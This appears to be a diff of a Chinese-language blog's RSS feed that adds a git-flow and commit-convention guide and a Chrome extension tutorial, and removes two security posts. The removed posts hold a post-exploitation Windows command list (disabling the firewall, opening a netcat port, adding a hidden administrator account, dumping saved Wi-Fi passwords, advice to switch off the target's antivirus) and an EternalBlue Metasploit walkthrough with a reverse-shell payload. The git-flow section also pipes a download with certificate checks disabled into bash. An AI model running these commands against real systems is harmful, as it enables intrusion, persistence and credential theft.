+&lt;h3 id=&quot;body&quot;&gt;Body&lt;/h3&gt;
+
+&lt;p&gt;Body 部分是对本次 commit 的详细描述，可以分成多行，也可以分文件描述变更明细。&lt;/p&gt;
+
+&lt;h3 id=&quot;footer&quot;&gt;Footer&lt;/h3&gt;
+
+&lt;p&gt;Footer 部分只用于两种情况。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;(1) 不兼容的变动&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;如果当前代码与上一个版本不兼容，则 Footer 部分以BREAKING CHANGE开头，后面是对变动的描述、以及变动理由和迁移方法。&lt;/p&gt;
+
+&lt;p&gt;如下的例子：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BREAKING CHANGE: isolate scope bindings definition has changed.
+
+    To migrate the code follow the example below:
+
+    Before:
+
+    scope: {
+      myAttr: 'attribute',
+    }
+
+    After:
+
+    scope: {
+      myAttr: '@',
+    }
+
+    The removed `inject` wasn't generaly useful for directives so there should be no code using it.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;(2) 关闭issue&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;如果当前 commit 针对某个issue，那么可以在 Footer 部分关闭这个 issue 。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;closes #214
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;也可以一次关闭多个issue&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Closes #123, #245, #992
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;附录c-标签命名规范&quot;&gt;附录C 标签命名规范&lt;/h2&gt;
+
+&lt;p&gt;标签版本号包含三位数字，前缀使用”v”，如v1.2.31-alpha&lt;/p&gt;
+
+&lt;h3 id=&quot;tag命名规范&quot;&gt;Tag命名规范&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;位数&lt;/th&gt;
+      &lt;th&gt;描述&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;第一位&lt;/td&gt;
+      &lt;td&gt;主版本号，功能模块有较大变动，如多个模块或者整体架构有变化&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;第二位&lt;/td&gt;
+      &lt;td&gt;功能有一定的增加变化，如增加了权限控制、自定义视图等&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;第三位&lt;/td&gt;
+      &lt;td&gt;问题bug修改的版本，每修改一个bug增加1&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;第四位&lt;/td&gt;
+      &lt;td&gt;希腊字母版本号，取值alpha、beta、rc、release&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;希腊字母版本号&quot;&gt;希腊字母版本号&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;strong&gt;alpha&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;也叫α版，此版本主要是以实现软件功能为主，通常只在软件开发者内部交流，一般而言，该版本软件的Bug较多，需要继续修改。&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;strong&gt;beta&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;此版本相对于α版已经有了很大的改进，消除了严重的错误，但还是存在着一些缺陷，需要经过多次测试来进一步消除，此版本主要的修改对像是软件的UI。&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;strong&gt;rc&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;此版本已经相当成熟了，基本上不存在导致错误的BUG，与即将发行的正式版相差无几，测试人员基本通过的版本。&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;strong&gt;release&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;此版本意味着“最终版本”、“上线版本”，在前面版本的一系列测试版之后，终归会有一个正式版本，是最终交付用户使用的一个版本。&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;附录d-git-flow工具&quot;&gt;附录D Git-flow工具&lt;/h2&gt;
+
+&lt;p&gt;可以使用工具实现git-flow流程&lt;/p&gt;
+
+&lt;h3 id=&quot;安装方式&quot;&gt;安装方式&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;操作系统&lt;/th&gt;
+      &lt;th&gt;安装方式&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;OSX&lt;/td&gt;
+      &lt;td&gt;brew install git-flow&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Linux&lt;/td&gt;
+      &lt;td&gt;apt-get install git-flow&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Windows&lt;/td&gt;
+      &lt;td&gt;wget -q -O - –no-check-certificate https://github.com/nvie/gitflow/raw/develop/contrib/gitflow-installer.sh | bash&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;IDEA&lt;/td&gt;
+      &lt;td&gt;Git Flow Integration&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;使用步骤&quot;&gt;使用步骤&lt;/h3&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 初始化&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git flow init
+&lt;span class=&quot;c&quot;&gt;# 开始新Feature&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git flow feature start MYFEATURE
+&lt;span class=&quot;c&quot;&gt;# Publish一个Feature(也就是push到远程)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git flow feature publish MYFEATURE
+&lt;span class=&quot;c&quot;&gt;# 获取Publish的Feature&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git flow feature pull origin MYFEATURE
+&lt;span class=&quot;c&quot;&gt;# 完成一个Feature&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git flow feature finish MYFEATURE
+&lt;span class=&quot;c&quot;&gt;# 开始一个Release&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git flow release start RELEASE &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;BASE]
+&lt;span class=&quot;c&quot;&gt;# Publish一个Release&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git flow release publish RELEASE
+&lt;span class=&quot;c&quot;&gt;# 发布Release&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git flow release finish RELEASE
+&lt;span class=&quot;c&quot;&gt;# 发布标签&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push &lt;span class=&quot;nt&quot;&gt;--tags&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# 开始一个Hotfix&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git flow hotfix start VERSION &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;BASENAME]
+&lt;span class=&quot;c&quot;&gt;# 发布一个Hotfix &lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git flow hotfix finish VERSION
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>  
+               <pubDate>Wed, 28 Mar 2018 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2018/03/git-flow/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2018/03/git-flow/</guid>  
+               </item>  
+          
+            <item>  
+               <title>怎样快速创建一个chrome扩展并进行发布</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#1-helloworld&quot; id=&quot;markdown-toc-1-helloworld&quot;&gt;1. HelloWorld&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#11-程序结构&quot; id=&quot;markdown-toc-11-程序结构&quot;&gt;1.1 程序结构&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#12-manifest文件&quot; id=&quot;markdown-toc-12-manifest文件&quot;&gt;1.2 manifest文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#13-hellohtml文件&quot; id=&quot;markdown-toc-13-hellohtml文件&quot;&gt;1.3 hello.html文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#14-插件安装调试&quot; id=&quot;markdown-toc-14-插件安装调试&quot;&gt;1.4 插件安装调试&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;如果你需要编写&lt;strong&gt;chrome extension&lt;/strong&gt;，这篇文章将是很好的入门，若需要更加深入的了解和编写扩展程序，请参看&lt;a href=&quot;https://developer.chrome.com/extensions/overview&quot;&gt;Google官方文档&lt;/a&gt;。本篇文章将会创建一个简单的扩展程序，完成扩展基本编写及发布的过程。&lt;/p&gt;
+
+&lt;h2 id=&quot;1-helloworld&quot;&gt;1. HelloWorld&lt;/h2&gt;
+
+&lt;h3 id=&quot;11-程序结构&quot;&gt;1.1 程序结构&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|-- manifest.json
+|-- icon.png
+|-- hello.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;其中&lt;strong&gt;icon.png&lt;/strong&gt;图标为16x16像素的即可&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;12-manifest文件&quot;&gt;1.2 manifest文件&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;manifest.json&lt;/strong&gt;文件主要告知chrome浏览器插件的重要信息，例如名称、权限等。下面是最基本的描述信息，更全的&lt;strong&gt;manifes.jsont&lt;/strong&gt;配置明细，请参看&lt;a href=&quot;https://developer.chrome.com/extensions/manifest&quot;&gt;Manifest File Format&lt;/a&gt;。&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Hello Extensions&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Base Level Extension&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;manifest_version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;browser_action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;default_popup&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hello.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;default_icon&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hello_extensions.png&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;13-hellohtml文件&quot;&gt;1.3 hello.html文件&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;hello.html&lt;/strong&gt;是一个基本的html结构的文件，可以任意添加UI元素或者事件（某些事件需要在manifest.json中声明权限）。&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Hello Extensions&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;14-插件安装调试&quot;&gt;1.4 插件安装调试&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;打开chrome浏览器，地址栏输入&lt;code class=&quot;highlighter-rouge&quot;&gt;chrome://extensions&lt;/code&gt;打开扩展列表&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/chrome_extension_1.png&quot; alt=&quot;chrome_extension_1&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;勾选右上角的&lt;strong&gt;Developer Mode&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/chrome_extension_2.png&quot; alt=&quot;chrome_extension_1&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;点击&lt;strong&gt;Load Unpacked Extension&lt;/strong&gt;按钮加载到程序目录即可&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/chrome_extension_3.png&quot; alt=&quot;chrome_extension_1&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;点击Chrome浏览器扩展栏即可实现基本的程序运行&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/chrome_extension_4.png&quot; alt=&quot;chrome_extension_1&quot; /&gt;&lt;/p&gt;
+</description>  
+               <pubDate>Sun, 18 Mar 2018 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2018/03/how-to-create-chrome-extension/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2018/03/how-to-create-chrome-extension/</guid>  
+               </item>  
+          
+            <item>  
                <title>使用jersey实现jwt认证</title>  
                <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#1-授权流程&quot; id=&quot;markdown-toc-1-授权流程&quot;&gt;1. 授权流程&lt;/a&gt;&lt;/li&gt;
@@ -729,117 +1314,6 @@ java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; gitbucket.war
                <pubDate>Mon, 30 Oct 2017 00:00:00 +0800</pubDate>  
                <link>http://localhost:4000/2017/10/quick-build-gitbucker/</link>  
                <guid isPermaLink="true">http://localhost:4000/2017/10/quick-build-gitbucker/</guid>  
-               </item>  
-          
-            <item>  
-               <title>在渗透后非常有用的windows命令整理</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#在渗透后非常有用的windows命令整理&quot; id=&quot;markdown-toc-在渗透后非常有用的windows命令整理&quot;&gt;在渗透后非常有用的windows命令整理&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#注意事项&quot; id=&quot;markdown-toc-注意事项&quot;&gt;注意事项&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#命令明细&quot; id=&quot;markdown-toc-命令明细&quot;&gt;命令明细&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;在渗透后非常有用的windows命令整理&quot;&gt;在渗透后非常有用的windows命令整理&lt;/h1&gt;
-
-&lt;h2 id=&quot;注意事项&quot;&gt;注意事项&lt;/h2&gt;
-
-&lt;p&gt;以下整理的命令不一定在所有windows平台适用，如win10版本等高版本的系统会被拒绝访问，某些杀毒软件会弹出提示框显示授权操作，所以建议是拿到超级管理员权限，且将目标主机的杀毒软件卸载或者关闭。&lt;/p&gt;
-
-&lt;h2 id=&quot;命令明细&quot;&gt;命令明细&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 关闭防火墙
-netsh advfirewall set allprofiles state off
-netsh firewall set opmode disable
-
-# 添加防火墙出入站规则（关闭防火墙失败的情况）
-netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445
-# 检查查看防火墙配置的出入站规则
-netsh firewall show portopening
-
-# 查看进程杀死进程
-tasklist
-tskill 6486
-
-# 创建用户并添加到管理员组
-net user vinny$ 123321 /add
-net localgroup administrators vinny$ /add
-
-# 删除目标用户或者密码
-net user vinny$ *
-net user vinny$ /delete
-
-# 压缩文件夹或者文件（目标系统安装好winrar的情况）
-&quot;%ProgramFiles%\Winrar\rar&quot; a -ag -k -r -s -ibck a.rar &quot;SAP BYD资料&quot;
-&quot;%ProgramFiles%\Winrar\rar&quot; a -ag -k -r -s -ibck a.rar 1.txt 2.txt
-
-# 查看目标机器保存的无线热点和密码
-netsh wlan show profile
-netsh wlan show profile name=&quot;menote2&quot; key=clear
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>  
-               <pubDate>Sun, 29 Oct 2017 00:00:00 +0800</pubDate>  
-               <link>http://localhost:4000/2017/10/windows-useful-cmds/</link>  
-               <guid isPermaLink="true">http://localhost:4000/2017/10/windows-useful-cmds/</guid>  
-               </item>  
-          
-            <item>  
-               <title>永恒之蓝(ms17-010-eternalblue)漏洞利用</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#永恒之蓝ms17-010-eternalblue漏洞利用&quot; id=&quot;markdown-toc-永恒之蓝ms17-010-eternalblue漏洞利用&quot;&gt;永恒之蓝(ms17-010-eternalblue)漏洞利用&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#适用版本&quot; id=&quot;markdown-toc-适用版本&quot;&gt;适用版本&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#目标扫描&quot; id=&quot;markdown-toc-目标扫描&quot;&gt;目标扫描&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#漏洞攻击&quot; id=&quot;markdown-toc-漏洞攻击&quot;&gt;漏洞攻击&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;永恒之蓝ms17-010-eternalblue漏洞利用&quot;&gt;永恒之蓝(ms17-010-eternalblue)漏洞利用&lt;/h1&gt;
-
-&lt;h2 id=&quot;适用版本&quot;&gt;适用版本&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Windows XP (all services pack) (x86) (x64)&lt;/li&gt;
-  &lt;li&gt;Windows Server 2003 SP0 (x86)&lt;/li&gt;
-  &lt;li&gt;Windows Server 2003 SP1/SP2 (x86)&lt;/li&gt;
-  &lt;li&gt;Windows Server 2003 (x64)&lt;/li&gt;
-  &lt;li&gt;Windows Vista (x86)&lt;/li&gt;
-  &lt;li&gt;Windows Vista (x64)&lt;/li&gt;
-  &lt;li&gt;Windows Server 2008 (x86)&lt;/li&gt;
-  &lt;li&gt;Windows Server 2008 R2 (x86) (x64)&lt;/li&gt;
-  &lt;li&gt;Windows 7 (all services pack) (x86) (x64)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;目标扫描&quot;&gt;目标扫描&lt;/h2&gt;
-
-&lt;p&gt;这里以内网扫描进行测试，所有扫描内网中所有主机，并检查其是否存在此漏洞。&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/smb/smb_ms17_010
-msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 192.168.1.0/24
-msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;THREADS 100
-msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;漏洞攻击&quot;&gt;漏洞攻击&lt;/h2&gt;
-
-&lt;p&gt;确定好目标主机后，就可以使用启动监听并进行攻击&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/windows/smb/ms17_010_eternalblue
-msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/meterpreter/reverse_tcp
-msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 192.168.1.15
-msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT 4444
-msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOST 192.168.1.110
-msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>  
-               <pubDate>Sat, 28 Oct 2017 00:00:00 +0800</pubDate>  
-               <link>http://localhost:4000/2017/10/ms17-010-eternalblue/</link>  
-               <guid isPermaLink="true">http://localhost:4000/2017/10/ms17-010-eternalblue/</guid>  
                </item>  
           
     </channel>  
